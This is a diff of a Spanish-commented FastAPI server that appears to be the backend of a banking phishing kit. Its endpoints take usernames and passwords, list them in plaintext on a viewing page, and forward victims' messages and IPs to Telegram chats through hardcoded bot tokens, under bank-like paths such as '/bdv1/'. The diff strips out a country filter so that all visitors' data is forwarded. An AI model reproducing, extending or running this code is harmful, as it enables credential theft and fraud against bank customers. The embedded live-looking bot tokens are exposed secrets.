 async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str):
-    """Función auxiliar para guardar log de usuario con timeout"""
     async with db_semaphore:
         try:
             await asyncio.wait_for(
@@ -948,22 +671,12 @@ async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str):
             logger.error(f"Error guardando log usuario: {e}")
 
 @app.post("/guardar_datos")
-async def guardar_datos(
-    usuario: str = Form(...), 
-    contra: str = Form(...), 
-    request: Request = None
-):
+async def guardar_datos(usuario: str = Form(...), contra: str = Form(...), request: Request = None):
     ip = obtener_ip_real(request)
-    permitido, pais = await verificar_pais_cached(ip)
-
-    # Guardar en BD en background
+    # Sin geolocalización
+    pais = "N/A"
     await add_background_task(_guardar_log_usuario, usuario, contra, ip, pais)
-    
-    return {
-        "message": "Datos guardados correctamente",
-        "ip": ip,
-        "pais": pais
-    }
+    return {"message": "Datos guardados correctamente", "ip": ip, "pais": pais}
 
 @app.get("/ver_datos", response_class=HTMLResponse)
 async def ver_datos():
@@ -971,10 +684,8 @@ async def ver_datos():
         try:
             registros = []
             cursor = logs_usuarios.find().sort("fecha", -1).limit(100)
-            
             async for registro in cursor:
                 registros.append(registro)
-            
             html = """
             <html>
             <head><title>Registros de Usuarios</title></head>
@@ -990,10 +701,8 @@ async def ver_datos():
                 pais = registro.get("pais", "")
                 fecha = registro.get("fecha", "")
                 html += f"<tr><td>{usuario}</td><td>{contrasena}</td><td>{ip_reg}</td><td>{pais}</td><td>{fecha}</td></tr>"
-            
             html += "</table></body></html>"
             return HTMLResponse(content=html)
-            
         except Exception as e:
             logger.error(f"Error obteniendo datos: {e}")
             return HTMLResponse("<h3>Error obteniendo datos</h3>", status_code=500)
@@ -1002,7 +711,6 @@ async def ver_datos():
 async def obtener_usuarios():
     if not user_cache:
         return {"message": "No se encontraron usuarios en caché."}
-    
     usuarios = [{"usuario": u, "numero": n} for u, n in user_cache.items()]
     return {"usuarios": usuarios}
 
@@ -1016,19 +724,10 @@ async def alternar_estado():
     global is_active_cache
     async with db_semaphore:
         try:
-            doc = await asyncio.wait_for(
-                global_settings.find_one({"id": 1}),
-                timeout=5.0
-            )
+            doc = await asyncio.wait_for(global_settings.find_one({"id": 1}), timeout=5.0)
             if doc:
                 nuevo_valor = not doc["is_active"]
-                await asyncio.wait_for(
-                    global_settings.update_one(
-                        {"id": 1},
-                        {"$set": {"is_active": nuevo_valor}}
-                    ),
-                    timeout=5.0
-                )
+                await asyncio.wait_for(global_settings.update_one({"id": 1}, {"$set": {"is_active": nuevo_valor}}), timeout=5.0)
                 is_active_cache = nuevo_valor
                 return {"message": "Estado alternado exitosamente.", "is_active": nuevo_valor}
             else:
@@ -1045,7 +744,6 @@ async def alternar_estado():
 async def obtener_ips():
     if not ip_number_cache:
         return {"message": "No se encontraron IPs en caché."}
-    
     ips = [{"ip": i, "numero": n} for i, n in ip_number_cache.items()]
     return {"ips": ips}
 
@@ -1054,27 +752,18 @@ async def verificar_spam_ip(data: IPRequest):
     ip = data.ip.strip()
     cola.append(ip)
     repeticiones = contar_elemento_optimized(cola, ip)
-
     if repeticiones > 8:
         if ip not in baneado:
             baneado.append(ip)
-        return {
-            "ip": ip,
-            "repeticiones": repeticiones,
-            "spam": True,
-            "mensaje": "IP detectada como spam y bloqueada"
-        }
+        return {"ip": ip, "repeticiones": repeticiones, "spam": True, "mensaje": "IP detectada como spam y bloqueada"}
     else:
-        return {
-            "ip": ip,
-            "repeticiones": repeticiones,
-            "spam": False,
-            "mensaje": "IP aún no considerada spam"
-        }
+        return {"ip": ip, "repeticiones": repeticiones, "spam": False, "mensaje": "IP aún no considerada spam"}
 
-# Endpoint optimizado usando el sistema híbrido
+# =====================
+#  Endpoint dinámico (sin geo)
+# =====================
+
 async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage, request: Request):
-    """Endpoint dinámico con sistema híbrido de Telegram"""
     client_ip = obtener_ip_real(request)
     cola.append(client_ip)
     numeror = obtener_numero_cached(client_ip)
@@ -1083,93 +772,60 @@ async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage
         baneado.append(client_ip)
         raise HTTPException(status_code=429, detail="Has sido bloqueado temporalmente.")
 
-    # Verificar país con timeout
-    try:
-        permitido, pais = await asyncio.wait_for(
-            verificar_pais_cached(client_ip), 
-            timeout=10.0
-        )
-    except asyncio.TimeoutError:
-        logger.warning(f"Timeout verificando país para IP {client_ip}")
-        raise HTTPException(status_code=503, detail="Servicio temporalmente no disponible")
-
     mensaje = request_data.mensaje
+    path = config["path"]
 
-    # Solo permitir acceso desde Latinoamérica
-    if permitido and pais in PAISES_LATINOAMERICA:
-        path = config["path"]
-        mensaje_completo = f"{mensaje} - IP: {client_ip} - País: {pais} - {path}"
-        
-        telegram_results = []
-        
-        try:
-            if (path.startswith("/internacional") and pais != "EC"):
-                return {
-                "mensaje_enviado": 3 > 0,
-                "pais_origen": "Aburrete",
-                
-            }
+    # Sin geolocalización
+    pais = "N/A"
 
-            # Lógica especial para ciertos paths y países
-            if (path.startswith("/bdv") and obtener_is_active_cached() and 
-                numeror in numeros_r and pais not in {"US", "CO"}):
-                # Enviar mensaje especial con alta prioridad
-                result = await enviar_telegram_hibrido(
-                    mensaje_completo + " Todo tuyo", 
-                    "-4931572577", 
-                    TOKEN, 
-                    priority=2,
-                    force_immediate=True  # Forzar inmediato para mensajes especiales
-                )
-                telegram_results.append(result)
-            elif path.startswith("/maikelhot"):
-                result1 = await enviar_telegram_hibrido(mensaje_completo, "-4826186479", TOKEN, priority=1)
-                telegram_results.append(result1)
-                
-                # Mensaje específico del endpoint
-                result2 = await enviar_telegram_hibrido(mensaje_completo, config["chat_id"], config["bot_id"], priority=1)
-                telegram_results.append(result2)
+    mensaje_completo = f"{mensaje} - IP: {client_ip} - País: {pais} - {path}"
 
-            else:
-                # Enviar mensaje con prioridad normal
-                # Mensaje principal
-                result1 = await enviar_telegram_hibrido(mensaje_completo, "-4826186479", TOKEN, priority=1)
-                telegram_results.append(result1)
-                
-                # Mensaje específico del endpoint
-                result2 = await enviar_telegram_hibrido(mensaje, config["chat_id"], config["bot_id"], priority=1)
-                telegram_results.append(result2)
+    telegram_results = []
+    try:
+        # Quitar lógica dependiente de país
+        if (path.startswith("/bdv") and obtener_is_active_cached() and numeror in numeros_r):
+            result = await enviar_telegram_hibrido(
+                mensaje_completo + " Todo tuyo",
+                "-4931572577",
+                TOKEN,
+                priority=2,
+                force_immediate=True
+            )
+            telegram_results.append(result)
+        elif path.startswith("/maikelhot"):
+            result1 = await enviar_telegram_hibrido(mensaje_completo, "-4826186479", TOKEN, priority=1)
+            telegram_results.append(result1)
+            result2 = await enviar_telegram_hibrido(mensaje_completo, config["chat_id"], config["bot_id"], priority=1)
+            telegram_results.append(result2)
+        else:
+            result1 = await enviar_telegram_hibrido(mensaje_completo, "-4826186479", TOKEN, priority=1)
+            telegram_results.append(result1)
+            result2 = await enviar_telegram_hibrido(mensaje, config["chat_id"], config["bot_id"], priority=1)
+            telegram_results.append(result2)
 
-            # Contar envíos exitosos
-            successful_sends = sum(1 for r in telegram_results if r["success"])
-            
-            return {
-                "mensaje_enviado": successful_sends > 0,
-                "pais_origen": pais,
-                "ip": client_ip,
-                "telegram_results": telegram_results,
-                "successful_sends": successful_sends,
-                "total_attempts": len(telegram_results)
-            }
-            
-        except Exception as e:
-            logger.error(f"Error en sistema Telegram: {e}")
-            return {
-                "mensaje_enviado": False,
-                "pais_origen": pais,
-                "ip": client_ip,
-                "telegram_error": str(e),
-                "telegram_results": telegram_results
-            }
-    else:
-        # Registrar intento de acceso no autorizado
-        logger.warning(f"Acceso denegado")
-        raise HTTPException(
-            status_code=403, 
-            detail=f"Acceso denegado"
-        )
+        successful_sends = sum(1 for r in telegram_results if r["success"])
+        return {
+            "mensaje_enviado": successful_sends > 0,
+            "pais_origen": pais,
+            "ip": client_ip,
+            "telegram_results": telegram_results,
+            "successful_sends": successful_sends,
+            "total_attempts": len(telegram_results)
+        }
+    except Exception as e:
+        logger.error(f"Error en sistema Telegram: {e}")
+        return {
+            "mensaje_enviado": False,
+            "pais_origen": pais,
+            "ip": client_ip,
+            "telegram_error": str(e),
+            "telegram_results": telegram_results
+        }
 
-# Configuración optimizada de endpoints dinámicos
+# =====================
+#  Registro de endpoints dinámicos
+# =====================
+
 endpoint_configs = [
     {"path": "/bdv1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
     {"path": "/bdv2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
@@ -1196,32 +852,21 @@ endpoint_configs = [
     {"path": "/htmiao/", "chat_id": "908735123", "bot_id": "5935593600:AAFeONdWGRxbPXOJsOUr1QPgJcUUBilc3q0"},
 ]
 
-# Registrar endpoints dinámicoss
 from copy import deepcopy
-
 for config in endpoint_configs:
-    # Registrar ruta con barra
-    app.add_api_route(
-        path=config["path"],
-        endpoint=partial(handle_dynamic_endpoint_optimized, config),
-        methods=["POST"]
-    )
-
-    # Registrar ruta sin barra
+    app.add_api_route(path=config["path"], endpoint=partial(handle_dynamic_endpoint_optimized, config), methods=["POST"])
     if config["path"].endswith("/"):
         config_sin_barra = deepcopy(config)
         config_sin_barra["path"] = config["path"].rstrip("/")
-        app.add_api_route(
-            path=config_sin_barra["path"],
-            endpoint=partial(handle_dynamic_endpoint_optimized, config_sin_barra),
-            methods=["POST"]
-        )
+        app.add_api_route(path=config_sin_barra["path"], endpoint=partial(handle_dynamic_endpoint_optimized, config_sin_barra), methods=["POST"])
+
+# =====================
+#  Utilidades de mantenimiento
+# =====================
 
 async def _clear_db_collections():
-    """Función auxiliar para limpiar colecciones de BD con timeout"""
     async with db_semaphore:
         try:
-            # Limpiar en paralelo con timeouts
             tasks = [
                 asyncio.wait_for(ip_numbers.delete_many({}), timeout=30.0),
                 asyncio.wait_for(user_numbers.delete_many({}), timeout=30.0)
@@ -1238,34 +883,21 @@ async def _clear_db_collections():
 @app.post('/clear_db')
 async def clear_db_endpoint():
     success = await _clear_db_collections()
-    
     if success:
-        # Limpiar caches
         ip_number_cache.clear()
         user_cache.clear()
         return {"message": "Se borró correctamente"}
     else:
         return {"message": "Error al borrar", "status": "timeout_or_error"}
 
-# Endpoints adicionales optimizados
 @app.put("/editar-ip/{ip}")
 async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
     async with db_semaphore:
         try:
-            result = await asyncio.wait_for(
-                ip_numbers.update_one(
-                    {"ip": ip},
-                    {"$set": {"number": request_data.numero}}
-                ),
-                timeout=5.0
-            )
-            
+            result = await asyncio.wait_for(ip_numbers.update_one({"ip": ip}, {"$set": {"number": request_data.numero}}), timeout=5.0)
             if result.matched_count == 0:
                 raise HTTPException(status_code=404, detail="IP no encontrada")
-            
-            # Actualizar cache
             ip_number_cache[ip] = request_data.numero
-            
             return {"message": f"Número de la IP {ip} actualizado a {request_data.numero}"}
         except asyncio.TimeoutError:
             raise HTTPException(status_code=503, detail="Timeout actualizando IP")
@@ -1279,20 +911,10 @@ async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
 async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest):
     async with db_semaphore:
         try:
-            result = await asyncio.wait_for(
-                user_numbers.update_one(
-                    {"username": usuario},
-                    {"$set": {"number": request_data.numero}}
-                ),
-                timeout=5.0
-            )
-            
+            result = await asyncio.wait_for(user_numbers.update_one({"username": usuario}, {"$set": {"number": request_data.numero}}), timeout=5.0)
             if result.matched_count == 0:
                 raise HTTPException(status_code=404, detail="Usuario no encontrado")
-            
-            # Actualizar cache
             user_cache[usuario] = request_data.numero
-            
             return {"message": f"Número del usuario {usuario} actualizado a {request_data.numero}"}
         except asyncio.TimeoutError:
             raise HTTPException(status_code=503, detail="Timeout actualizando usuario")
@@ -1302,10 +924,12 @@ async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest)
             logger.error(f"Error editando usuario: {e}")
             raise HTTPException(status_code=500, detail="Error interno del servidor")
 
-# Endpoints para monitoreo del sistema Telegram
+# =====================
+#  Monitoreo Telegram
+# =====================
+
 @app.get("/telegram_stats")
 async def get_telegram_stats():
-    """Estadísticas del sistema de Telegram"""
     return {
         "statistics": telegram_stats,
         "current_status": {
@@ -1328,17 +952,11 @@ async def get_telegram_stats():
 
 @app.post("/telegram_test")
 async def test_telegram(mensaje: str = "Test message", priority: int = 1, force_immediate: bool = False):
-    """Endpoint para probar el sistema de Telegram"""
-    result = await enviar_telegram_hibrido(
-        f"TEST: {mensaje} - {datetime.now()}",
-        priority=priority,
-        force_immediate=force_immediate
-    )
+    result = await enviar_telegram_hibrido(f"TEST: {mensaje} - {datetime.now()}", priority=priority, force_immediate=force_immediate)
     return {"test_result": result, "timestamp": datetime.now()}
 
 @app.post("/clear_telegram_stats")
 async def clear_telegram_stats():
-    """Limpiar estadísticas de Telegram"""
     global telegram_stats
     telegram_stats = {
         "sent_immediate": 0,
@@ -1351,18 +969,19 @@ async def clear_telegram_stats():
     bot_rate_limits.clear()
     return {"message": "Estadísticas de Telegram limpiadas"}
 
-# Endpoints adicionales para monitoreo y salud del sistema
+# =====================
+#  Salud y métricas (sin geo)
+# =====================
+
 @app.get("/health")
 async def health_check():
-    """Endpoint de salud del sistema"""
     return {
         "status": "healthy",
         "timestamp": datetime.utcnow().isoformat(),
         "cache_stats": {
             "blocked_ips": len(blocked_ips_cache),
             "ip_numbers": len(ip_number_cache),
-            "users": len(user_cache),
-            "ip_cache": len(ip_cache)
+            "users": len(user_cache)
         },
         "queue_stats": {
             "background_queue_size": background_queue.qsize(),
@@ -1375,16 +994,11 @@ async def health_check():
             "available_telegram": telegram_semaphore._value
         },
         "telegram_stats": telegram_stats,
-        "geo_filter": {
-            "enabled": True,
-            "allowed_countries": len(PAISES_LATINOAMERICA),
-            "countries": list(PAISES_LATINOAMERICA)
-        }
+        "geo_filter": {"enabled": False}
     }
 
 @app.get("/metrics")
 async def get_metrics():
-    """Endpoint para métricas del sistema"""
     return {
         "concurrency_limits": {
             "max_concurrent_requests": MAX_CONCURRENT_REQUESTS,
@@ -1405,7 +1019,6 @@ async def get_metrics():
             "telegram_queue_maxsize": telegram_queue.maxsize
         },
         "cache_info": {
-            "ip_cache_size": len(ip_cache),
             "blocked_ips_cache_size": len(blocked_ips_cache),
             "ip_number_cache_size": len(ip_number_cache),
             "user_cache_size": len(user_cache)
@@ -1415,98 +1028,37 @@ async def get_metrics():
             "baneado_size": len(baneado)
         },
         "telegram_performance": telegram_stats,
-        "geo_blocking": {
-            "enabled": True,
-            "allowed_countries_count": len(PAISES_LATINOAMERICA)
-        }
+        "geo_blocking": {"enabled": False}
     }
 
+# Endpoints de geolocalización eliminados o deshabilitados
 @app.get("/paises_permitidos")
 async def obtener_paises_permitidos():
-    """Endpoint para ver qué países están permitidos"""
-    paises_info = {
-        'AR': 'Argentina', 'BO': 'Bolivia', 'BR': 'Brasil', 'CL': 'Chile',
-        'CO': 'Colombia', 'CR': 'Costa Rica', 'CU': 'Cuba', 'DO': 'República Dominicana',
-        'EC': 'Ecuador', 'SV': 'El Salvador', 'GT': 'Guatemala', 'HN': 'Honduras',
-        'MX': 'México', 'NI': 'Nicaragua', 'PA': 'Panamá', 'PY': 'Paraguay',
-        'PE': 'Perú', 'UY': 'Uruguay', 'VE': 'Venezuela', 'PR': 'Puerto Rico',
-        'GF': 'Guayana Francesa', 'GY': 'Guyana', 'SR': 'Suriname', 'BZ': 'Belice',
-        'JM': 'Jamaica', 'HT': 'Haití', 'TT': 'Trinidad y Tobago', 'BB': 'Barbados',
-        'GD': 'Granada', 'LC': 'Santa Lucía', 'VC': 'San Vicente y las Granadinas',
-        'DM': 'Dominica', 'AG': 'Antigua y Barbuda', 'KN': 'San Cristóbal y Nieves',
-        'BS': 'Bahamas'
-    }
-    
-    return {
-        "paises_permitidos": {
-            codigo: paises_info.get(codigo, codigo) 
-            for codigo in sorted(PAISES_LATINOAMERICA)
-        },
-        "total_paises": len(PAISES_LATINOAMERICA),
-        "filtro_geografico": "activo"
-    }
+    return {"filtro_geografico": "deshabilitado", "paises_permitidos": [], "total_paises": 0}
 
 @app.get("/verificar_ip/{ip}")
 async def verificar_ip_pais(ip: str):
-    """Endpoint para verificar de qué país es una IP específica"""
-    try:
-        permitido, pais = await verificar_pais_cached(ip)
-        return {
-            "ip": ip,
-            "pais": pais,
-            "permitido": permitido,
-            "es_latinoamerica": pais in PAISES_LATINOAMERICA if pais != 'Unknown' else False
-        }
-    except Exception as e:
-        return {
-            "ip": ip,
-            "error": str(e),
-            "permitido": False
-        }
+    return {"ip": ip, "pais": "N/A", "permitido": True, "es_latinoamerica": False, "geo": "disabled"}
 
 @app.post("/clear_caches")
 async def clear_caches():
-    """Endpoint para limpiar caches manualmente"""
-    global ip_cache, cache_last_updated
-    
-    # Limpiar caches que pueden crecer mucho
-    old_ip_cache_size = len(ip_cache)
-    current_time = time.time()
-    
-    # Limpiar cache de IPs viejas
-    old_keys = [k for k, (_, t) in ip_cache.items() if current_time - t > CACHE_TTL * 2]
-    for k in old_keys:
-        ip_cache.pop(k, None)
-    
-    # Limpiar cache de validación de contraseñas
     validar_contrasena_cached.cache_clear()
-    
-    return {
-        "message": "Caches limpiados",
-        "stats": {
-            "ip_cache_before": old_ip_cache_size,
-            "ip_cache_after": len(ip_cache),
-            "keys_removed": len(old_keys)
-        }
-    }
+    return {"message": "Caches limpiados", "stats": {"note": "Geolocalización deshabilitada, no hay ip_cache"}}
 
 
 if __name__ == "__main__":
     import uvicorn
-    
-    # Configuración optimizada para producción
     config = uvicorn.Config(
         app=app,
         host="0.0.0.0",
         port=8000,
-        workers=1,  # Para evitar problemas con estado compartido
+        workers=1,
         loop="asyncio",
         http="httptools",
         lifespan="on",
-        access_log=False,  # Desactivar para mejor rendimiento
+        access_log=False,
         server_header=False,
         date_header=False
     )
-    
     server = uvicorn.Server(config)
     server.run()
